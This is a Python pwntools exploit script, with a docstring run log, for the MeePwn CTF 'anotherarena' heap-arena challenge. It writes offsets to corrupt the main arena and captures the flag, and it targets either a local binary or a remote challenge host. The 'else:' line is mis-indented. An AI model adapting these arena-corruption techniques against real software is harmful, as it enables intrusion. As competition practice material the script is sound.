'''
root@ubuntu:/mnt/hgfs/shared/ctf/meepwn_anotherarena# python solve.py
[*] '/mnt/hgfs/shared/ctf/meepwn_anotherarena/anotherarena'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './anotherarena': pid 29573
[*] Paused (press any to continue)
[DEBUG] Sent 0x3 bytes:
    '50\n'
[DEBUG] Sent 0x4 bytes:
    00000000  90 f7 ff ff                                         │····││
    00000004
[DEBUG] Sent 0x4 bytes:
    00000000  bd 20 60 00                                         │· `·││
    00000004
[DEBUG] Sent 0x4 bytes:
    '\x00' * 0x4
[DEBUG] Sent 0x4 bytes:
    00000000  2e af c0 c0                                         │.···││
    00000004
[DEBUG] Sent 0x4 bytes:
    00000000  c8 00 00 00                                         │····││
    00000004
[DEBUG] Sent 0x3 bytes:
    '104'
[DEBUG] Sent 0x34 bytes:
    'A' * 0x34
[*] Switching to interactive mode
[*] Process './anotherarena' stopped with exit code 0 (pid 29573)
[DEBUG] Received 0x77 bytes:
    'Good boy! Your license: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMeePwnCTF{oveRwrit3_another_(main)_arena}\n'
    '\n'
Good boy! Your license: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMeePwnCTF{oveRwrit3_another_(main)_arena}

[*] Got EOF while reading in interactive
$
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[*] Got EOF while sending in interactive
'''

from pwn import *
import sys, time

context.binary = "./anotherarena"
binary = ELF("./anotherarena")
context.log_level = "debug"

HOST = "139.59.241.76"
PORT = 31335

if len(sys.argv) == 1:
  p = process(["./anotherarena"])
  pause()
  
 else:
  p = remote(HOST, PORT)  

def write_thread(offset, data):
    p.send(p32(offset))
    time.sleep(0.5)
    p.send(p32(data))
    time.sleep(0.5)

offset = 0x870

p.sendline(str(50))
write_thread(0xfffff790, 0x6020bd)      # 0x7f -> 0x70
write_thread(0, 0xc0c0aff6 - 200)
#write_thread(4, 200)
p.send(p32(200))

p.send(str(0x68))    # 0x68
time.sleep(0.5)
p.send("A" * 0x34)

p.interactive()
